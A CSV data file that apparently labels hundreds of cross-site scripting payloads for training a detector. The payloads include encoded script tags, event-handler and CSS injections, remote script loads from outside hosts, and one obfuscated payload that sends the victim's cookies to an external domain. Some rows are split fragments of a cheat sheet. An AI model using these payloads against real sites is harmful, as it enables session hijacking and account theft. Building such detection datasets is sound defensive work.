payload,label
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-,1
%2bADw-script%2bAD4-%0d%0aalert(1)%2bADw-%2fscript%2bAD4-,1
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,1
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,1
+ADw-/title+AD4APA-meta http-equiv+AD0-'content-type' content+AD0-'text/html+ADs-charset+AD0-utf-7'+AD4-,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&oe=Windows-31J,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&oe=CP932,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&eo=MS932,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&cs=jis,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&charset=utf8,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&enc=sjis,1
left:expression(eval(alert(1))),1
#444;background-image: expression(alert(1));,1
"width:expression(eval( String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,102,101,114,114,117,104,46,109,97,118,105,116,117,110,97,46,99,111,109,47,120,115,115,47,63,39,43,101,115,99,97,112,101,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)))",1
%22%20onload=%22this.src='http://www.unirostock.de';this.onload=function(){};%22%20x=%22,1
XSS%22%3E%3C/div%3E%3Ciframe%20src=http://www.unirostock.de%20style=width:600px;height:500px%3E,1
"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",1
</b><script>alert(7)</script>,1
background-image: url(javascript:alert(1)),1
[url=javascript:alert('XSS');]click me[/url],1
[url=javascript:alert(1);]click me[/url],1
oncontextmenu=prompt(document.cookie),1
"""><input>javascript:alert(document.cookie);>",1
"""><% response.write ""<script type=text/javascript>alert(document.cookie)</script>"" %>",1
"""><img src=1 onerror=alert(document.cookie);>",1
"""><IMG SRC=JaVaScRiPt:alert(document.cookie)>",1
"""><IMG """"""><SCRIPT>alert(document.cookie)</SCRIPT>"">",1
"""><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",1
"""><IMG SRC=""jav	ascript:alert(document.cookie);"">",1
"""><IMG SRC=""jav&#x09;ascript:alert(document.cookie);"">",1
"\"";alert(document.cookie);//",1
"""></TITLE><SCRIPT>alert(document.cookie);</SCRIPT>",1
"""><%tag style=""xss:expression(alert(document.cookie))"" %>",1
"""><script>alert(document.cookie)</script>",1
"""><h1>",1
"""><tetxarea></script><img src=1 onerror=alert(document.cookie);>",1
"<script>window.navigate(""http://localhost/calismalar/xss/index.php?cookie=+document.cookie"")</script>",1
%uff1cscript%uff1ealert(document.cookie)%uff1c/script%uff1ealert,1
“/></a></><img src=1.gif onerror=alert(document.cookie)>,1
"</script>"">'><script>prompt(String.fromCharCode(88.83.83))</script>",1
"""><option>""><button>img src=x onerror=alert(/xss/);></button></option>",1
</title><script>alert(/xss/)</script>,1
"'""><script>alert(document.domain)</script>",1
"""><iframe onclick=alert(Evan)></iframe>",1
"</textarea>""><script>prompt(Evan)</script>",1
"//>'>""><img src=x onerror=prompt(Evan);>",1
"""><img src=x onerror=prompt(1)>.asd.asd",1
"'""()&%1<ScRiPt >prompt(963191)</ScRiPt>",1
"'""--></style></script><script>alert(/xss/)</script>",1
"""><img src=x.png onerror=prompt(""XSS"");>",1
"""><img src=x onerror=prompt(1);>",1
<img src=x onerror=alert(0)>,1
"""><script>prompt(1)</script>",1
"""/><script>alert(document.cookie);</script>",1
"""><IMG SRC=# onmouseover=""alert('xss')"">",1
"<svg onload=""prompt(/xss by evan/);"">",1
"#!prettyPhoto/<a onclick=""alert(/XSS by Evan/);"">/",1
"<IMG SRC=""jalert('XSS');"">",1
<IMG SRC=jalert('XSS')>,1
"false,false,false);});alert(1); //",1
</title><!-- --><body onload=alert(1);></iframe src=http://google.com>-->,1
"'""onmouseover=""prompt(1)""",1
"""><script>alert(document.domain)</script>",1
<script>alert(1);</script>,1
<script>prompt(1);</script>,1
<script>confirm (/xss by evan/);</script>,1
"<script src=""http://rhainfosec.com/evil.js"">",1
<scRiPt>alert(1);</scrIPt>,1
<scr<script>ipt>alert(1)</scr<script>ipt>,1
"<a href=""rhainfosec.com"" onclimbatree=alert(1)>ClickHere</a>",1
<body/onhashchange=alert(1)><a href=#>clickit,1
<img/src=aaa.jpg onerror=prompt(1);>,1
<video src=x onerror=prompt(1);>,1
<audio src=x onerror=prompt(1);>,1
"<iframesrc=""javascript:alert(2)"">",1
"<iframe/src=""data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1
<embed/src=//goo.gl/nlX0P>,1
"<form action=""Javascript:alert(1)""><input type=submit>",1
"<isindex action=""javascript:alert(1)"" type=image>",1
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>,1
"<isindex action=data:text/html, type=image>",1
"<formaction='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK",1
"<isindexformaction=""javascript:alert(1)"" type=image>",1
"<input type=""image"" formaction=JaVaScript:alert(0)>",1
<form><button formaction=javascript&colon;alert(/xssbyevan/)>CLICKME,1
<object/data=//goo.gl/nlX0P?,1
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">",1
"<applet code=""javascript:confirm(document.cookie);"">",1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1
<svg/onload=prompt(1);>,1
<marquee/onstart=confirm(2)>/,1
<body onload=prompt(1);>,1
<select autofocus onfocus=alert(1)>,1
<textarea autofocus onfocus=alert(1)>,1
<keygen autofocus onfocus=alert(1)>,1
"<video><source onerror=""javascript:alert(1)"">",1
<q/oncut=alert(1)>,1
<q/oncut=open()>,1
<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>,1
"<a onmouseover=""javascript:window.onerror=alert;throw 1>",1
"<img src=x onerror=""javascript:window.onerror=alert;throw 1"">",1
<a onmouseover=location=’javascript:alert(1)>click,1
"<body onfocus=""location='javascrpt:alert(1) >123",1
<svg><script>alert&#40/1/&#41</script>,1
"<meta content=""&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1
"<svg><![CDATA[><imagexlink:href=""]]><img/src=xx:xonerror=alert(2)//""></svg>",1
"<svg xmlns:xlink=""http://www.w3.org/1999/xlink""><a><circle r=100 /><animate attributeName=""xlink:href"" values="";javascript:alert(1)"" begin=""0s"" dur=""0.1s"" fill=""freeze""/>",1
"<svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:\u0061lert(1);""></g></svg>",1
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1
"<meta http-equiv=""refresh"" content=""0;url=//goo.gl/nlX0P"">",1
""" autofocusonfocus=alert(1)//",1
""" onmouseover=""prompt(0) x=""",1
""" onfocusin=alert(1) autofocus x=""",1
""" onfocusout=alert(1) autofocus x=""",1
""" onblur=alert(1) autofocus a=""",1
""";alert(1)//",1
"""/></script><svg onload='-/""/-prompt(/xss by evan/)//'",1
"""><img src=x <img src=x onerror=prompt(7)>=<img src=x onerror=prompt(7)>(1)>",1
"<img src=""<img src=search""/onerror=alert(""xss"")//"">",1
"""><h1 ondblclick=prompt(document.domain)>xss by evan</h1>",1
"';prompt(String.fromCharCode(120,+115,+115))//\';",1
"<iframe\uB\uC\uAsrc\uB\uC\uA=\uB\uC\uA ""javascript:alert(1);"">",1
<><><><><><a onmouseover=prompt(1337)>XSS</a>,1
"<a href=""java%1B(Jscript:alert(1)"">test",1
');alert(document.cookie)//,1
"""></iframe><script>alert(document.cookie)</script>xss",1
'+prompt(9)+',1
"<input type=""hidden"" name=""asdhakjshdkjashdkjashd"" value=""\"" onload=confirm(000) />"" />",1
javascript:alert(1);,1
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",1
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},1
<img/src=`%00` onerror=this.onerror=confirm(1),1
"<form><isindex formaction=""javascript&colon;confirm(1)""",1
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,1
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,1
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,1
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,1
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",1
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",1
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",1
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",1
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",1
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",1
http://www.google<script .com>alert(document.location)</script,1
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",1
<img/src=@&#32;&#13; onerror = prompt('&#49;'),1
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
<script ~~~>alert(0%0)</script ~~~>,1
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},1
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",1
<iframe/%00/ src=javaSCRIPT&colon;alert(1),1
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1
</plaintext\></|\><plaintext/onmouseover=prompt(1),1
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",1
<%<!--'%><script>alert(1);</script -->,1
"<script src=""data:text/javascript,alert(1)""></script>",1
<iframe/src \/\/onload = prompt(1),1
<iframe/onreadystatechange=alert(1),1
<svg/onload=alert(1),1
<input value=<><iframe/src=javascript:confirm(1),1
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1
http://www.<script>alert(1)</script .com,1
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,1
<svg><script ?>alert(1),1
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1
<img src=`xx:xx`onerror=alert(1)>,1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
<svg contentScriptType=text/vbs><script>MsgBox+1,1
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",1
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,1
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",1
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",1
ject data=javascript&colon;\u0061&#x6C;&#101%72t(1)><ob,1
<script>+-+-1-+-+alert(1)</script>,1
<body/onload=&lt;!--&gt;&#10alert(1)>,1
<script itworksinallbrowsers>/*<script* */alert(1)</script,1
<img src ?itworksonchrome?\/onerror = alert(1),1
<svg><script>//&NewLine;confirm(1);</script </svg>,1
<svg><script onlypossibleinopera:-)> alert(1),1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1
<script x> alert(1) </script 1=2,1
"<div/onmouseover='alert(1)'> style=""x:"">",1
<--`<img/src=` onerror=alert(1)> --!>,1
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",1
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",1
"""><img src=x onerror=window.open('https://www.google.com/');>",1
<form><button formaction=javascript&colon;alert(1)>CLICKME,1
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",1
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",1
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",1
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",1
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
“><script>alert(123);</script>,1
"<IMG SRC=javascript:alert(""XSS"")>",1
"<IMG SRC=`javascript:alert(""uceka says, 'XSS'"")`>",1
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",1
<a onmouseover=alert(document.cookie)>xxs link</a>,1
“><img src=bogus onError=alert(23)>,1
"<IMG SRC=# onmouseover=""alert('xxs')"">",1
"<IMG SRC= onmouseover=""alert('xxs')"">",1
"<IMG onmouseover=""alert('xxs')"">",1
"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,1
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
<!--[if gte IE 4]>,1
<SCRIPT>alert('XSS');</SCRIPT>,1
<![endif]-->,1
"EMBED SRC=""http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=""never"" and allownetworking=""internal"" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:",1
"org/xss.swf"" AllowScriptAccess=""always""></EMBED>",1
"a=""get"";",1
"b=""URL(\"""";",1
"c=""javascript:"";",1
"d=""alert('XSS');\"")"";",1
eval(a+b+c+d);,1
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML>",1
"<SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
"<XML SRC=""xsstest.xml"" ID=I></XML>",1
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,1
<HTML><BODY>,1
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",1
"<?import namespace=""t"" implementation=""#default#time2"">",1
"<t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert(""XSS"")</SCRIPT>"">",1
</BODY></HTML>,1
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
<? echo('<SCR)';,1
"echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
"<A HREF=""h",1
"tt	p://6	6.000146.0x7.147/"">XSS</A>",1
<,1
%3C,1
&lt,1
&lt;,1
&LT,1
&LT;,1
&#60,1
&#060,1
&#0060,1
&#00060,1
&#000060,1
&#0000060,1
&#60;,1
&#060;,1
&#0060;,1
&#00060;,1
&#000060;,1
&#0000060;,1
&#x3c,1
&#x03c,1
&#x003c,1
&#x0003c,1
&#x00003c,1
&#x000003c,1
&#x3c;,1
&#x03c;,1
&#x003c;,1
&#x0003c;,1
&#x00003c;,1
&#x000003c;,1
&#X3c,1
&#X03c,1
&#X003c,1
&#X0003c,1
&#X00003c,1
&#X000003c,1
&#X3c;,1
&#X03c;,1
&#X003c;,1
&#X0003c;,1
&#X00003c;,1
&#X000003c;,1
&#x3C,1
&#x03C,1
&#x003C,1
&#x0003C,1
&#x00003C,1
&#x000003C,1
&#x3C;,1
&#x03C;,1
&#x003C;,1
&#x0003C;,1
&#x00003C;,1
&#x000003C;,1
&#X3C,1
&#X03C,1
&#X003C,1
&#X0003C,1
&#X00003C,1
&#X000003C,1
&#X3C;,1
&#X03C;,1
&#X003C;,1
&#X0003C;,1
&#X00003C;,1
&#X000003C;,1
\x3c,1
\x3C,1
\u003c,1
\u003C,1
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.cookie=true</SCRIPT>"">",1
<SCRIPT>document.cookie=true;</SCRIPT>,1
"<IMG SRC=""jav ascript:document.cookie=true;"">",1
"<IMG SRC=""javascript:document.cookie=true;"">",1
"<IMG SRC=""  javascript:document.cookie=true;"">",1
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>",1
<SCRIPT>document.cookie=true;//<</SCRIPT>,1
<SCRIPT <B>document.cookie=true;</SCRIPT>,1
"<iframe src=""javascript:document.cookie=true;>",1
<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>,1
</TITLE><SCRIPT>document.cookie=true;</SCRIPT>,1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:document.cookie=true;"">",1
"<BODY BACKGROUND=""javascript:document.cookie=true;"">",1
<BODY ONLOAD=document.cookie=true;>,1
"<IMG DYNSRC=""javascript:document.cookie=true;"">",1
"<IMG LOWSRC=""javascript:document.cookie=true;"">",1
"<BGSOUND SRC=""javascript:document.cookie=true;"">",1
"<BR SIZE=""&{document.cookie=true}"">",1
"<LAYER SRC=""javascript:document.cookie=true;""></LAYER>",1
"<LINK REL=""stylesheet"" HREF=""javascript:document.cookie=true;"">",1
"<STYLE>li {list-style-image: url(""javascript:document.cookie=true;"");</STYLE><UL><LI>CrossSiteScripting",1
¼script¾document.cookie=true;¼/script¾,1
"<IFRAME SRC=""javascript:document.cookie=true;""></IFRAME>",1
"<FRAMESET><FRAME SRC=""javascript:document.cookie=true;""></FRAMESET>",1
"<TABLE BACKGROUND=""javascript:document.cookie=true;"">",1
"<TABLE><TD BACKGROUND=""javascript:document.cookie=true;"">",1
"<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
"<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
"<DIV STYLE=""width: expression(document.cookie=true);"">",1
<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>,1
"<IMG STYLE=""CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)"">",1
"<CrossSiteScripting STYLE=""CrossSiteScripting:expression(document.cookie=true)"">",1
"exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting(""*//*"");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>",1
"<STYLE TYPE=""text/javascript"">document.cookie=true;</STYLE>",1
"<STYLE>.CrossSiteScripting{background-image:url(""javascript:document.cookie=true"");}</STYLE><A CLASS=CrossSiteScripting></A>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:document.cookie=true"")}</STYLE>",1
"<BASE HREF=""javascript:document.cookie=true;//"">",1
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>,1
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:document.cookie=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
"<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:document.cookie=true""></B></I></XML><SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>""></BODY></HTML>",1
<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>,1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-",1
"<a href=""javascript#document.cookie=true;"">",1
"<div onmouseover=""document.cookie=true;"">",1
"<img src=""javascript:document.cookie=true;"">",1
"<img dynsrc=""javascript:document.cookie=true;"">",1
"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",1
"<bgsound src=""javascript:document.cookie=true;"">",1
&<script>document.cookie=true;</script>,1
&{document.cookie=true;};,1
<img src=&{document.cookie=true;};>,1
"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
"<img src=""mocha:document.cookie=true;"">",1
"<img src=""livescript:document.cookie=true;"">",1
"<a href=""about:<script>document.cookie=true;</script>"">",1
"<body onload=""document.cookie=true;"">",1
